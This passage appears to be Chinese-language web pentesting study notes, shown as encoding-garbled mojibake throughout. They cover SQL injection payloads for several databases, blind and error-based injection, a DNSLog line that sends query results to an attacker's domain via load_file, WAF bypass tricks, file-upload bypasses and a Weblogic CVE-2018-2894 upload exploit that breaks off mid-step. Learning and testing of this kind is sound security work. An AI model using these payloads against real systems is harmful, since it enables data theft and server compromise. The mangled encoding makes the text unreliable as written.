é˜²æ³¨å…¥ï¼š\n\n**è‡ªå¸¦é˜²å¾¡ï¼šPHPä¸­çš„é­”æœ¯å¼•å·å¼€å…³å’Œaddslashes()å‡½æ•°**\n\n`magic_quotes_gpc`å¼€å…³è¢«æ‰“å¼€æ—¶`ï¼ˆmagic_quotes_gpc=ONï¼‰`æˆ–è¾“å…¥å†…å®¹è¢«`addslashes`å‡½æ•°å¤„ç†åæ—¶è¾“å…¥æ•°æ®ä¸­å«æœ‰å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ ä¸NULLå­—ç¬¦ï¼Œéƒ½ä¼šè¢«è‡ªåŠ¨åŠ ä¸Šåæ–œæ ï¼Œé˜»æ­¢SQLæ³¨å…¥\n\nè§£å†³æ–¹æ¡ˆï¼šè¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼ŒMySQLèƒ½è‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²æ‰§è¡Œ\n\n**å†…ç½®å‡½æ•°è®¤è¯**\n\næ²¡æ•‘äº†\n\n**å…³é”®å­—éªŒè¯**\n\nå¯å°è¯•å¤§å°å†™ç»•è¿‡\n\n**WAFé˜²æŠ¤**\n\næ‰¾æ–¹æ³•ï¼ˆè§ä¸Šæ–¹å¯¼å›¾ï¼‰å°è¯•å§\n\n**SQLMAP** \n\n\n\n## DAY 14 webæ¼æ´ SQLæ³¨å…¥ æ³¨å…¥ç±»å‹ æäº¤æ³¨å…¥\n\n**æäº¤å‚æ•°ç±»å‹ï¼š**\n\næ•°å­—ï¼Œå­—ç¬¦ï¼Œæœç´¢ï¼ŒJSONç­‰\n\n**è¯·æ±‚æ–¹æ³•ï¼š**\n\nGETï¼ŒPOSTï¼ŒCOOKIEï¼ŒREQUESTï¼ŒHTTP HEADERç­‰\n\n**PHPå†…ç½®å˜é‡**\n\n$_GETï¼ˆGETä¼ å‚å†…å®¹ï¼‰\n\n$_POSTï¼ˆPOSTä¼ å‚å†…å®¹ï¼‰\n\n$_REUQESTï¼ˆGETå’ŒPOSTä¼ å‚å†…å®¹ï¼‰\n\n$_SERVERï¼ˆä¸æœåŠ¡å™¨æœ‰å…³å†…å®¹ï¼‰\n\n\n\n**SQLè¯­å¥å¹²æ‰°ç¬¦å·ï¼Œçœ‹æƒ…å†µè¿›è¡Œé—­åˆæˆ–æ³¨é‡Š**\n\n'ï¼Œ\"ï¼Œ%ï¼Œ)ï¼Œ}ç­‰\n\n\n\n**æ•°å­—å‹ï¼š**æ— å¼•å·åŒ…è£¹\n\n**å­—ç¬¦å‹ï¼š**æœ‰å¼•å·åŒ…è£¹ï¼Œéœ€è¦é—­åˆ\n\n\n\n## DAY15 webæ¼æ´ SQLæ³¨å…¥ Oracleï¼ŒMongoDBç­‰æ³¨å…¥\n\nå½“æ³¨å…¥åˆ°ä¸€ä¸ªä¸ç†Ÿæ‚‰çš„æ•°æ®åº“æ—¶ï¼Œå¯æœç´¢å¯¹åº”æ•°æ®åº“çš„å‡½æ•°æ¥å¸®åŠ©æˆ‘ä»¬\n\næ•°æ®åº“çš„ç”¨æˆ·æƒé™æ˜¯ç”±è¿æ¥SQLçš„é…ç½®æ–‡ä»¶å†³å®šçš„\n\n\n\n**ä¸åŒæ•°æ®åº“çš„ç»“æ„**\n\n- **Access**ï¼ˆ.mdbæ–‡ä»¶ï¼‰\n  - è¡¨å\n    - åˆ—å\n      - æ•°æ®\n\nç‰¹ç‚¹ï¼šä¸åŒæ•°æ®åº“æ˜¯åˆ†ç¦»çš„ï¼Œæ²¡å•¥åŠŸèƒ½\n\n\n\n- **MySQLï¼ŒMSSQLç­‰**\n  - æ•°æ®åº“å\n    - è¡¨å\n      - åˆ—å\n        - æ•°æ®\n\n\n\n\n\n\n- MSSQL\n\nç‰¹ç‚¹ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€è¯»å–æ³¨å†Œè¡¨ã€è¯»æ–‡ä»¶ã€å†™æ–‡ä»¶ã€ä¸‹è½½è¿œç¨‹æ–‡ä»¶ã€å¯¼å‡ºæ•°æ®åˆ°æŒ‡å®šçš„æ•°æ®åº“æœåŠ¡å™¨ï¼ˆèƒ½å¹²çš„äº‹è´¼å¤šï¼‰\n\n\n\n**ä¸åŒæ•°æ®åº“æ³¨å…¥å‘½ä»¤**\n\n- Access\n\n```\nçŒœæµ‹å­—æ®µ\norder by 3\nè·å–è¡¨åï¼ˆå­—å…¸çŒœï¼‰\nunion select 1,2,3 from xxxx\nå¦‚æœxxxxè¡¨å­˜åœ¨å°±ä¼šè¿”å›æ•°æ®ï¼Œæ²¡æœ‰åˆ™ç©º\nè·å–åˆ—åï¼ˆå­—å…¸çŒœï¼‰\nunion select 1,xxx,3 from xxxx\nå¦‚æœxxxåˆ—å­˜åœ¨å°±ä¼šè¿”å›æ•°æ®ï¼Œæ²¡æœ‰åˆ™ç©º\n```\n\n- MSSQL\n\n```\nåˆ¤æ–­æ•°æ®åº“ç±»å‹\nand exists (select count(*) from sysobjects) è¿”å›æ­£å¸¸ä¸ºMSSQL\nåˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬\næœ‰å›æ˜¾ï¼šand 1=@@version--\næ— å›æ˜¾ï¼šand substring((select @@version),22,4)='2008'--æ— å›æ˜¾ï¼Œ2008å³ä¸ºç‰ˆæœ¬ï¼ŒæŠ¥é”™è¯´æ˜ä¸æ˜¯\næ³¨å…¥ç‚¹æƒé™åˆ¤æ–­\nselect is_srvrolemember('sysadmin');  åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºsa\nselect is_srvrolemember('db_owner');  åˆ¤æ–­å½“å‰ç”¨æˆ·å†™æ–‡ä»¶ã€è¯»æ–‡ä»¶çš„æƒé™ï¼ˆdb_ownerï¼‰\nselect is_srvrolemember('public');  åˆ¤æ–­æ˜¯å¦æœ‰publicæƒé™ï¼Œå¯ä»¥çˆ†ç ´è¡¨\n```\n\n- PostgreSQL\n\n```\nçŒœæµ‹å­—æ®µ\norder by 3\nè·å–å½“å‰æ•°æ®åº“\nunion select null,null,current_database()--\nç”¨æˆ·åï¼šuser\nç”¨æˆ·æƒé™ï¼šcurrent_schema()\nä¼šè¯ç”¨æˆ·ï¼šsession_user\nè·å–è¡¨å\nunion select null,string_agg(relname,','),null,null from pg_stat_user_tables\nè·å–åˆ—å\nunion select null,string_agg(column_name,','),null,null from information_schema.columns\nè·å–æ•°æ®\nunion select null,string_agg(xxxxx,','),null,null from è¡¨å\n```\n\n- Oracle\n\n```\nçŒœæµ‹å­—æ®µ\norder by 3\nåˆ¤æ–­å­—æ®µç±»å‹\nunion select null,null,'null' from dual å¦‚æœå›æ˜¾æ­£å¸¸åˆ™è¯´æ˜3ä½ç½®æ˜¯æ•°å­—å‹ï¼Œåä¹‹åˆ™ä¸ºå­—ç¬¦å‹\nç¡®å®šå›æ˜¾ä½ç½®\nunion select 1,2,'3' from dual å‡è®¾1,2ä¸ºæ•°å­—ï¼Œ3ä¸ºå­—ç¬¦\nè·å–è¡¨å\nunion select 1,(select table_name from user_tables where rownum=1) from dual\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('ç¬¬ä¸€ä¸ªè¡¨')) from dual ä»¥æ­¤ç±»æ¨çˆ†å‡ºæ‰€æœ‰è¡¨å\n\nè·å–åˆ—å\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='è¡¨åï¼ˆå¤§å†™ï¼‰') from dual\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='è¡¨åï¼ˆå¤§å†™ï¼‰' and culumn_name not in ('ç¬¬ä¸€ä¸ªå­—æ®µ')) from dual ä»¥æ­¤ç±»æ¨çˆ†å‡ºæ‰€æœ‰è¡¨å\nè·å–æ•°æ®\nunion select 1,å­—æ®µ1||å­—æ®µ2||å­—æ®µ3...||å­—æ®µn from è¡¨å where rownum=1 -- åœ¨Oracleä¸­group_concatåªèƒ½è”ä¿©\n\n```\n\n- MangoDBï¼šç”¨NoSQLAttackæ‰“ \n\n```\n$neå…³é”®å­—ï¼Œæ„å‘³ä¸ç­‰äº\nMangoDBè¿›è¡Œæ“ä½œæ—¶åº”å½“å…ˆå°†å‰é¢çš„å¯¹è±¡é—­åˆ'});return ({\nè·å–å½“å‰æ•°æ®åº“\ntitle:tojson(db),xxx:'1\ndb.getCollectionNames()å‡½æ•°è·å–åˆ°çš„æ˜¯æ•°ç»„ï¼Œéœ€è¦ç”¨tojsonå‡½æ•°è½¬åŒ–ä¸ºå­—ç¬¦ä¸² \nè·å–æ‰€æœ‰é›†åˆï¼ˆè¡¨ï¼‰\ntitle:tojson(db.getCollectionNames()),xxx:'1\nè·å–æ‰€æœ‰å­—æ®µ\ndb.Authority_confidentialä¸ºå½“å‰ä½¿ç”¨çš„è¡¨\nfindå‡½æ•°ç”¨äºæŸ¥è¯¢ï¼Œ[0]ä¸ºç¬¬ä¸€æ¡æ•°æ®\ntitle:tojson(db.Authority_confidential.find()[0])\n```\n\n**SQLMAPï¼ŒNoSQLAttackï¼ŒPangolin**\n\n\n\n\n\n\n\n## DAY16 webæ¼æ´ SQLæ³¨å…¥ æŸ¥è¯¢æ–¹å¼ æŠ¥é”™ç›²æ³¨\n\n**æ•°æ®åº“çš„æŸ¥è¯¢æ–¹å¼**\n\n```\nselect æŸ¥è¯¢æ•°æ®ï¼ˆæœ€å¸¸è§çš„ï¼‰\nåœ¨ç½‘ç«™ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢çš„æ“ä½œ\nä¾‹ï¼šselect * from users where id=$id\n\ninsert æ’å…¥æ•°æ®\nåœ¨ç½‘ç«™ä¸­è¿›è¡Œç”¨æˆ·æ³¨å†Œæ·»åŠ ç­‰æ“ä½œ\nä¾‹ï¼šinsert into users(id,name,password) values(1,'Jlan','pass')\n\ndelete åˆ é™¤æ•°æ®\nåå°ç®¡ç†ä¸­åˆ é™¤çš„æ“ä½œ\nä¾‹ï¼šdelete from users where id=$id\n\nupdate æ›´æ–°æ•°æ®\nåå°ç®¡ç†æ•°æ®åŒæ­¥æˆ–ç¼“å­˜ç­‰æ“ä½œ\nä¾‹ï¼šupdate user set password='newpass' where id=1 and name='Jlan'\n\norder by æ’åºæ•°æ®\nä¸€èˆ¬ç»“åˆè¡¨åæˆ–åˆ—åè¿›è¡Œæ•°æ®æ’åºæ“ä½œ\nä¾‹ï¼š select * from users order by $id\n\nå¯ä»¥é€šè¿‡ä»¥ä¸ŠæŸ¥è¯¢æ–¹å¼ä¸ç½‘ç«™åº”ç”¨çš„å…³ç³»\né€šè¿‡æ³¨å…¥ç‚¹äº§ç”Ÿçš„åœ°æ–¹æˆ–åº”ç”¨çŒœåˆ°å¯¹æ–¹çš„SQLæŸ¥è¯¢æ–¹å¼\n\n```\n\n**ç›²æ³¨**\n\n**å†…å®¹ï¼š**ç›²æ³¨å°±æ˜¯åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œè·å–çš„æ•°æ®ä¸èƒ½å›æ˜¾è‡³å‰ç«¯é¡µé¢ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç›²æ³¨\n\n**åˆ†ç±»ï¼š**å¸ƒå°”ç›²æ³¨ï¼ˆé€»è¾‘åˆ¤æ–­ï¼‰ï¼Œæ—¶é—´ç›²æ³¨ï¼ˆå»¶æ—¶åˆ¤æ–­ï¼‰ï¼ŒæŠ¥é”™ç›²æ³¨ï¼ˆæŠ¥é”™å›æ˜¾ï¼‰\n\n**å¸¸ç”¨å‡½æ•°ï¼š**\n\nlike 'xxx%'\tåˆ¤æ–­xxxæˆ–xxx...æ˜¯å¦æˆç«‹\n\nregexp '^xxx[a-z]'\tåŒ¹é…xxxä»¥åŠxxx...ç­‰\n\nif(æ¡ä»¶,è¿”å›å€¼çœŸ,è¿”å›å€¼å‡)\n\nsleep(æ—¶é—´ç§’)\n\nmid(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)\n\nsubstr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)\n\nleft(å­—ç¬¦ä¸²,æˆªå–é•¿åº¦)\n\nlength(å­—ç¬¦ä¸²)\n\nord=ascii\n\nascii(å­—ç¬¦)=asciiå€¼\n\n**æŠ¥é”™ç›²æ³¨**\n\nå¸¸ç”¨å‡½æ•°ï¼š`floor,updatexml,extractvalue`\n\nextractvalueå‡½æ•°ï¼š\n\nè¯­æ³•ï¼š`extractvalue(ç›®æ ‡xmlæ–‡æ¡£,xmlè·¯å¾„)`\n\næŠ¥é”™ï¼šå½“ç›®æ ‡xmlæ–‡æ¡£ä¸å­˜åœ¨æ—¶ä¼šè¿”å›xmlè·¯å¾„\n\n1ã€é€šè¿‡flooræŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:\n`and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)`\n\n2ã€é€šè¿‡ExtractValueæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:\n`and extractvalue(1, concat(0x7e,æƒ³æŸ¥è¯¢çš„å†…å®¹,0x7e))`\n\n3ã€é€šè¿‡UpdateXmlæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:\n`and 1=(updatexml(1,concat(0x7e,(select database())),1))`\n\nå‰©ä¸‹çš„å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://www.jianshu.com/p/bc35f8dd4f7c\n\n**å¸ƒå°”ç›²æ³¨**\n\nè¿”å›é¡µé¢åªæœ‰æ­£ç¡®ä¸å¦ä¸¤ç§å½¢å¼ï¼Œé€šè¿‡ifè¯­å¥ä»¥åŠè¿”å›å€¼æ¥å¾—åˆ°ç»“æœ\n\n\n\n\n\n\n\n**æ—¶é—´ç›²æ³¨**\n\nå¸¸ç”¨å‡½æ•°ï¼š`if,sleep`\n\nifå‡½æ•°ï¼š\n\nè¯­æ³•ï¼šif(æ¡ä»¶,è¿”å›å€¼çœŸ,è¿”å›å€¼å‡)\n\nsleepå‡½æ•°ï¼š\n\nè¯­æ³•ï¼šsleep(æ—¶é—´ï¼ˆå•ä½ä¸ºç§’ï¼‰)\n\nç”¨æ³•ï¼š~~ä¹–ä¹–ç”¨sqlmapå•Šå–‚~~\n\nå¯ä»¥å…ˆç”¨`length()`åˆ¤æ–­é•¿åº¦\n\n`and sleep(if(database()='a',5,0))`\n\n**Accessåç§»æ³¨å…¥**\n\n**åç§»æ³¨å…¥ä¸»è¦æ˜¯é’ˆå¯¹çŸ¥é“è¡¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å­—æ®µçš„ã€‚**\n\n~~å¯ä»¥å…ˆè¯•è¯•çœ‹çœ‹æºä»£ç ä¸­è¡¨å•çš„å€¼æˆ–è€…URLç‰¹å¾ç­‰~~\n\n```\né¦–å…ˆçŒœæµ‹è¡¨ï¼šselect exists(select * from sys_admin);\nç„¶åçˆ†å‡ºå­—æ®µæ•°ï¼šorder by x\nç„¶åçˆ†å‡ºæ˜¾ç¤ºä½ï¼šunion select 1,2,3,4,5....,x from sys_admin\nçˆ†å‡ºæ˜¾ç¤ºä½çš„åŸºç¡€ä¸Šä¾æ¬¡é€’å‡ï¼Œç›´åˆ°é¡µé¢æ¢å¤æ­£å¸¸ä¸ºæ­¢ï¼šunion select 1,2,3,4,5....,y,* from sys_admin\næœ€ç»ˆå­—æ®µæ•°å°±ç­‰äºc=x-2*(x-y)\nä¸€çº§åç§»è¯­å¥ï¼š union select 1,2,3,4,5....c,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)\n```\n\n## DAY17 webæ¼æ´ SQLæ³¨å…¥ äºŒæ¬¡æ³¨å…¥ åŠ è§£å¯† DNSç­‰æ³¨å…¥\n\n**åŠ å¯†è§£å¯†**\n\næŸ¥çœ‹æŠ“åŒ…å†…å®¹ä¸­æ˜¯å¦æœ‰åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œå°è¯•è§£å¯†åè¿›è¡Œæ³¨å…¥æ—¶åº”å…ˆè¿›è¡ŒåŠ å¯†å†è¿›è¡Œ\n\n**äºŒæ¬¡æ³¨å…¥**\n\nåœ¨é¦–æ¬¡è¿›è¡Œæ³¨å†Œç­‰å†™å…¥æ•°æ®åº“çš„æ“ä½œæ—¶ï¼Œå°†SQLè¯­å¥å†™å…¥æ•°æ®åº“ï¼Œåœ¨æ›´æ–°æ•°æ®ç­‰æ“ä½œè¢«æ‰§è¡Œæ—¶ï¼Œè°ƒç”¨å‡ºå‰é¢æ„é€ å¥½çš„SQLè¯­å¥å¯¼è‡´æ³¨å…¥\n\n```\nä¾‹å­ï¼š\nåŸå§‹è¯­å¥ï¼š\nupdate set password='$new_pass' where username='$user' and password='$current_pass'\nå½“Jlanæ­£å¸¸æ‰§è¡Œè¯¥è¯­å¥æ—¶\nupdate set password='123456' where username='Jlan' and password='000000'\nä½†æ˜¯å¦‚æœæœ‰ä¸ªäººå°è¯•äºŒæ¬¡æ³¨å…¥æ„é€ å‡ºä»¥ä¸‹ç”¨æˆ·å\nusername=Jlan'#\næ­¤æ—¶è¿™ä¸ªäººå°è¯•æ›´æ”¹å¯†ç ï¼Œå°†ä¼šæ‰§è¡Œä¸‹åˆ—è¯­å¥\nupdate set password='123456' where username='Jlan'#' and password='000000'\n#åé¢çš„è¯­å¥å…¨è¢«å¿½ç•¥äº†ï¼Œæ‰€ä»¥çœŸæ­£æ‰§è¡Œçš„æ˜¯ä¸‹é¢çš„è¯­å¥\nupdate set password='123456' where username='Jlan'\næ­¤æ—¶é»‘å®¢è™½ç„¶æ²¡æœ‰æ‹¿åˆ°Jlançš„å¯†ç ä½†å´æˆåŠŸæ›´æ”¹äº†Jlançš„å¯†ç ï¼Œå®ŒæˆäºŒæ¬¡æ³¨å…¥\n```\n\n**DNSLogå¤–å¸¦æ³¨å…¥**ï¼ˆä»…æ”¯æŒWindowsï¼‰\n\nè¯¥æ–¹æ³•ä½¿ç”¨æ¡ä»¶\n\n- secure_file_priv **æ‹¥æœ‰è¯»å†™æƒé™**\n\n```sql\nsecure_file_priv = \"\"       # å¯ä»¥è¯»å–ç£ç›˜ç›®å½•\nsecure_file_priv = \"D:\\\"    # å¯ä»¥è¯»å–Dç›˜æ–‡ä»¶\nsecure_file_priv = null     # load_fileé™åˆ¶ï¼Œä¸èƒ½åŠ è½½æ–‡ä»¶\n```\n\n- åœ¨mysql 5.5.34 é»˜è®¤ä¸ºç©ºå¯ä»¥åŠ è½½æ–‡ä»¶ï¼Œä¹‹åçš„ç‰ˆæœ¬ä¸ºNULLï¼Œä¸èƒ½åŠ è½½æ–‡ä»¶\n\n```\nshow global variables like 'secure%';  //æŸ¥çœ‹æ˜¯å¦æœ‰å†™é™åˆ¶\n```\n\nåœ¨è¯»å†™æ–‡ä»¶æ¡ä»¶ä¸¥è‹›æ—¶ï¼Œå¯å°è¯•load_fileå‡½æ•°å°†æ•°æ®å¸¦å‡º\n\n```\nload_file(concat('\\\\\\\\',(æƒ³è¦å¸¦å‡ºçš„å†…å®¹),'.ä½ çš„URL\\\\kkk'))\n```\n\næ­¤æ—¶load_fileå‡½æ•°ä¼šå°è¯•å°†è®¿é—®URLï¼Œé€šè¿‡æˆ‘ä»¬æ„é€ çš„URLå³å¯å°†æ•°æ®å¸¦å‡º\n\n## DAY18 webæ¼æ´ SQLæ³¨å…¥ å †å æ³¨å…¥ WAFç»•è¿‡\n\n**å †å æŸ¥è¯¢æ³¨å…¥**\n\nå°†å¤šæ¡è¯­å¥è¿›è¡Œæ‰§è¡Œï¼Œä½¿ç”¨åˆ†å‰²ç¬¦è¿›è¡Œåˆ†å‰²ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œä¸€ä¸ªæ•°æ®çš„æ’å…¥\n\né™åˆ¶ï¼šåªæœ‰éƒ¨åˆ†æ•°æ®åº“ï¼ˆMySQLï¼‰æ”¯æŒå †å æ³¨å…¥\n\n**WAFç»•è¿‡**\n\n{% pullquote mindmap mindmap-md %}\n\n- WAFç»•è¿‡\n  - æ•°æ®\n    - å¤§å°å†™\n    - åŠ å¯†è§£å¯†\n    - ç¼–ç è§£ç \n    - ç­‰ä»·å‡½æ•°\n    - ç‰¹æ®Šç¬¦å·\n    - ååºåˆ—åŒ–\n    - æ³¨é‡Šç¬¦æ··ç”¨\n  - æ–¹å¼\n    - æ›´æ”¹æäº¤æ–¹å¼\n    - å˜å¼‚\n  - å…¶ä»–\n    - Fuzzå¤§æ³•\n    - æ•°æ®åº“ç‰¹æ€§\n    - åƒåœ¾æ•°æ®å·²å‡º\n    - HTTPå‚æ•°æ±¡æŸ“\n\n{% endpullquote %}\n\n**æ•°æ®åº“ç‰¹æ€§**\n\nMySQLï¼š\n\n```\n/*!50001 è¯­å¥*/;\næ„ä¸ºåªæœ‰5.00.01ä»¥ä¸Šç‰ˆæœ¬æ•°æ®åº“æ‰ä¼šæ‰§è¡Œ\n```\n\n**ç»•è¿‡**\n\n1. ```\n   union#kkk%0Aselect 1,2,3#\n   %0Aæ„ä¸ºæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥æœ€ç»ˆæ‰§è¡Œçš„è¯­å¥å¦‚ä¸‹\n   union \n   select 1,2,3#\n   ```\n\n2. IPç™½åå•ç»•è¿‡\n\n   ```\n   æ„é€ HTTPè¯·æ±‚å¤´\n   \n   \n   ```\n\n3. è®¿é—®é™æ€èµ„æºï¼ˆæ—§ç‰ˆæœ¬WAFæœ‰æ•ˆï¼‰\n\n   ```\n   /index.php/1.txt/?id=payload\n   ```\n\n4. URLç™½åå•ï¼ˆæ—§ç‰ˆæœ¬WAFæœ‰æ•ˆï¼‰\n\n   ```\n   WAFå¯èƒ½å¯¹ç®¡ç†é¡µé¢ç­‰ä¸è¿›è¡Œæ‹¦æˆªï¼Œå¯ä»¥å°è¯•æ’å…¥admin,manage,adminç­‰æ¥å°è¯•åŒ¹é…ç»•è¿‡\n   /?a=/admin/&id=payload\n   ```\n\n5. æ„é€ çˆ¬è™«\n\n   ```\n   å°è¯•ä¼ªé€ æœç´¢å¼•æ“ç­‰çˆ¬è™«çš„UAï¼ŒWAFå¯èƒ½æ”¾è¡Œ\n   ```\n\n\n**HTTPå‚æ•°æ±¡æŸ“**\n\nç¤ºä¾‹ï¼š\n\n```\n?id=1/**&id=-1 union select 1,2,3#*/\nå½“æˆ‘ä»¬ä½¿ç”¨ä¸Šé¢çš„è¯­å¥ä¼ å‚æ—¶ï¼ŒWAFæ”¶åˆ°çš„idå‚æ•°å¦‚ä¸‹\n1/**&id=-1 union select 1,2,3#*/\nå¯è§æˆ‘ä»¬æ”»å‡»å†…å®¹åŒ…å«åœ¨æ³¨é‡Šä¸­ï¼Œè¢«WAFå¿½ç•¥ï¼Œä½†å®é™…ä¸ŠPHPæ¥æ”¶åˆ°çš„å‚æ•°å¦‚ä¸‹\nid=-1 union select 1,2,3#*/\næˆåŠŸæ‰§è¡Œäº†è”åˆæŸ¥è¯¢\n```\n\n\n\n- Apache+PHP å–åé¢å‚æ•°\n- Tmocat+JSP å–å‰é¢å‚æ•°\n- Apache+Perl å–å‰é¢å‚æ•°\n- Apache+Python å–æ‰€æœ‰å‚æ•°ç”ŸæˆList\n- IIS+ASP å–æ‰€æœ‰å‚æ•°\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY20  webæ¼æ´ æ–‡ä»¶ä¸Šä¼ \n\næ–‡ä»¶ä¸Šä¼ æ¼æ´\n\n{% pullquote mindmap mindmap-md %}\n\n- æ–‡ä»¶ä¸Šä¼ æ¼æ´\n  - éªŒè¯/ç»•è¿‡\n    - å‰ç«¯\n      - JSé˜²æŠ¤\n\n    - åç«¯\n      - é»‘åå•\n        - ç‰¹æ®Šè§£æåç¼€\n        - .htaccessè§£æ\n        - å¤§å°å†™ç»•è¿‡\n        - ç‚¹ç»•è¿‡\n        - ç©ºæ ¼ç»•è¿‡\n        - ::$$DATAç»•è¿‡\n        - é…åˆè§£ææ¼æ´\n        - åŒåç¼€åç»•è¿‡\n\n      - ç™½åå•\n        - MIMEç»•è¿‡\n        - %00æˆªæ–­\n        - 0x00æˆªæ–­\n        - 0x0aæˆªæ–­\n\n      - å†…å®¹åŠå…¶ä»–\n        - æ–‡ä»¶å¤´æ£€æµ‹\n        - äºŒæ¬¡æ¸²æŸ“\n        - æ¡ä»¶ç«äº‰\n        - çªç ´getimagesize\n        - çªç ´exif_imagetype\n\n- æ¼æ´/ä¿®å¤\n  - è§£ææ¼æ´\n    - IIS6/7.x\n    - Apache\n    - Nginx\n\n  - CMSæ¼æ´\n  - ç¼–è¾‘å™¨æ¼æ´\n    - fckeditor\n    - ewebeditor\n    - ckeditor\n    - kindedit\n\n  - CVEç­‰æ¼æ´\n    - CVE-2015-5253\n    - CVE-2017-12615\n    - CVE-2019-2618\n\n- WAFç»•è¿‡\n  - å®‰å…¨ç‹—\n  - å®å¡”\n  - äº‘ç›¾\n\n\n{% endpullquote %}\n\n{% pullquote mindmap mindmap-md %}\n\n- åˆ©ç”¨æ€è·¯\n  - å¸¸è§„\n    - æ‰«æè·å–ä¸Šä¼ \n    - ä¼šå‘˜ä¸­å¿ƒä¸Šä¼ \n    - åå°ç³»ç»Ÿä¸Šä¼ \n    - å„ç§é€”å¾„ä¸Šä¼ \n  - CMS\n    - å·²çŸ¥CMSæºç \n  - ç¼–è¾‘å™¨\n    - ckeditor\n    - fckeditor\n    - kindeditor\n    - xxxxeditor\n  - å…¶ä»–\n    - ä»£ç å®¡è®¡\n    - å¹³å°æˆ–ç¬¬ä¸‰æ–¹åº”ç”¨ç­‰\n\n{% endpullquote %}\n\n**nginxè§£ææ¼æ´**\n\n```\nåŸç†ï¼šNginxæ‹¿åˆ°æ–‡ä»¶è·¯å¾„/test.jpg/1.phpåï¼Œä¸€çœ‹åç¼€æ˜¯.phpï¼Œä¾¿è®¤ä¸ºè¯¥æ–‡ä»¶æ˜¯phpæ–‡ä»¶ï¼Œè½¬äº¤ç»™phpå»å¤„ç†ã€‚phpä¸€çœ‹/test.jpg/1.phpä¸å­˜åœ¨ï¼Œä¾¿åˆ å»æœ€åçš„/test.phpï¼Œåˆçœ‹/test.jpgå­˜åœ¨ï¼Œä¾¿æŠŠ/test.jpgå½“æˆè¦æ‰§è¡Œçš„æ–‡ä»¶äº†ï¼Œåˆå› ä¸ºåç¼€ä¸º.jpgï¼Œphpè®¤ä¸ºè¿™ä¸æ˜¯phpæ–‡ä»¶ï¼Œäºæ˜¯è¿”å›â€œAccess denied.â€ã€‚\n\nè¿™å…¶ä¸­æ¶‰åŠåˆ°phpçš„ä¸€ä¸ªé€‰é¡¹ï¼šcgi.fix_pathinfoï¼Œè¯¥å€¼é»˜è®¤ä¸º1ï¼Œè¡¨ç¤ºå¼€å¯ã€‚å¼€å¯è¿™ä¸€é€‰é¡¹å¯å¸®åŠ©â€œä¿®ç†â€è·¯å¾„ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå½“phpé‡åˆ°æ–‡ä»¶è·¯å¾„â€œ/aaa.xxx/bbb.yyy/ccc.zzzâ€æ—¶ï¼Œè‹¥â€œ/aaa.xxx/bbb.yyy/ccc.zzzâ€ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»æ‰æœ€åçš„â€œ/ccc.zzzâ€ï¼Œç„¶ååˆ¤æ–­â€œ/aaa.xxx/bbb.yyyâ€æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æŠŠâ€œ/aaa.xxx/bbb.yyyâ€å½“åšæ–‡ä»¶â€œ/aaa.xxx/bbb.yyy/ccc.zzzâ€ï¼Œè‹¥â€œ/aaa.xxx/bbb.yyyâ€ä»ä¸å­˜åœ¨ï¼Œåˆ™ç»§ç»­å»æ‰â€œ/bbb.yyyâ€ï¼Œä»¥æ­¤ç±»æ¨ã€‚\n\nè€Œåœ¨æ–°ç‰ˆæœ¬çš„phpä¸­è¯¥æ¼æ´å¯èƒ½ä¸æˆåŠŸæ˜¯å› ä¸ºæ–°çš„phpå¼•å…¥äº†â€œsecurity.limit_extensionsâ€ï¼Œé™åˆ¶å¯æ‰§è¡Œæ–‡ä»¶çš„åç¼€ï¼Œé»˜è®¤åªæ‰§è¡Œ.phpæ–‡ä»¶\n```\n\nåœ¨ä¸Šä¼ åçš„æ–‡ä»¶ä¸­åŠ /xxx.phpå¯å°è¯•è§£ææ¼æ´\n\n**Weblogicä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰**\n\n[å¤ç°é“¾æ¥](https://blog.csdn.net/weixin_43625577/article/details/97001677)\n\nåˆ©ç”¨æ¡ä»¶ï¼šWeblogicç®¡ç†ç«¯æœªæˆæƒçš„ä¸¤ä¸ªé¡µé¢å­˜åœ¨ä»»æ„ä¸Šä¼ jspæ–‡ä»¶æ¼æ´ï¼Œ**è¿›è€Œè·å–æœåŠ¡å™¨æƒé™**\n\nå½±å“ç‰ˆæœ¬ï¼šweblogic 10.3.6.0ã€weblogic 12.1.3.0ã€weblogic 12.2.1.2ã€weblogic 12.2.1.3ã€‚\n\n```\nåœ¨base_domainä¸­çš„â€˜é«˜çº§â€™ä¸­å‹¾é€‰â€˜å¯åŠ¨WebæœåŠ¡æµ‹è¯•é¡µâ€™é€‰é¡¹ï¼Œä¿å­˜é…ç½®\nè®¿é—®/ws_utc/config.do\nè®¾ç½®Work Home 